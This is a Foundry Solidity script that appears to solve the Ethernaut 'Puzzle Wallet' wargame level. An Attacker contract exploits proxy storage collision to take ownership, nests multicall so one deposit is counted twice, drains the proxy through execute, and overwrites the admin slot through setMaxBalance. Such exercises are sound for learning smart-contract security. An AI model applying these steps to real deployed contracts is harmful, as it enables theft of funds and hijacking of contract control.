//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {PuzzleProxy, PuzzleWallet}  from "src/ethernaut24.sol";
import {console} from "lib/forge-std/src/console.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract ethernaut23Script is Script{
    PuzzleProxy instance = PuzzleProxy(payable(0x7cf0520C7b504daeA49ea459Bcb7aB9D7825F6Ae)); 
    PuzzleWallet wallet = PuzzleWallet(payable(address(instance)));    

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

       Attacker attac = new Attacker{value : 0.1 ether}();

       attac.attack();

        console.log("Max balance:", wallet.maxBalance());
        console.log("Attacker wallet balance:", wallet.balances(address(attac)));
        console.log("Proxy ETH balance:", address(instance).balance);
        console.log("Attacker ETH balance:", address(attac).balance);


       console.log("attacker address : ",address(attac));
       console.log("Pending admin:", instance.pendingAdmin());
       console.log("Pending admin:", instance.pendingAdmin());

       console.log("Wallet owner:", wallet.owner());  
       console.log("proxy owner: ",instance.admin());

        vm.stopBroadcast();
    }
}

contract Attacker{
    PuzzleProxy instance = PuzzleProxy(payable(0x7cf0520C7b504daeA49ea459Bcb7aB9D7825F6Ae));  
    PuzzleWallet wallet = PuzzleWallet(payable(address(instance)));
 
    constructor() payable{
    }

    function attack() public{
        //step 1 : setting owner
        instance.proposeNewAdmin(address(this));

        //step 2 : adding to whitelist
        wallet.addToWhitelist(address(this));

        //step 3 : approveing pending admin as admin ---not able to due to some cintrains
        //wallet.setMaxBalance(uint256(uint160(address(address(this)))));
        //instance.approveNewAdmin(address(this));

        //step 4 : multicall thing 
        bytes memory data1 = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory innerArray = new bytes[](1);
        innerArray[0] = data1;

        bytes memory data0 = abi.encodeWithSelector(wallet.multicall.selector, innerArray);

        bytes[] memory arr = new bytes[](2);
        arr[0] = data0;
        arr[1] = data1;

        wallet.multicall{value: 0.01 ether}(arr);

        console.log("balance of wallet : ", wallet.balances(address(this)));
        console.log("balacne of instance : ", address(instance).balance);


        //step 5 : attempting to make proxy zero

        wallet.execute(address(this),0.01 ether,"");

        console.log("balance of proxy           : ", address(instance).balance);
        console.log("balance of attacker wallet : ", wallet.balances(address(this)));

        //step 6 : approveing pending admin as admin

        console.log("real admin of proxy(befroe attack) : ", instance.admin());
        wallet.setMaxBalance(uint256(uint160(address(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779))));
        //instance.approveNewAdmin(address(this));

        console.log("real admin of proxy     : ", instance.admin());

    }

    receive() external payable {}

}
